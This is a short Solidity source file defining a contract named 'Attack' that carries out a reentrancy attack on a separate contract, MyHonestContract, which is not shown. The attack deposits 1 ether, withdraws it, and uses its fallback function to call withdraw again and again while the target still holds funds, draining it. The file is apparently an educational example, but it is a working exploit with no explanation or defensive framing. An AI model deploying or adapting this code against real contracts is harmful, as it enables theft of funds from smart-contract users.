//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack {
    MyHonestContract public honestContract;

    constructor(address _honestContractAddress){
        honestContract = MyHonestContract(_honestContractAddress);
    }

    fallback() external payable {
        if( address(honestContract).balance  >= 1 ether){
            honestContract.withdraw(1 ether);
        }
    }

    function attck() external payable {
        require(msg.value >= 1 ether );
        honestContract.deposit{value: 1 ether}();
        honestContract.withdraw(1 ether);
    }

    function getBalances() public view returns(uint){
        return address(this).balance;
    }
}
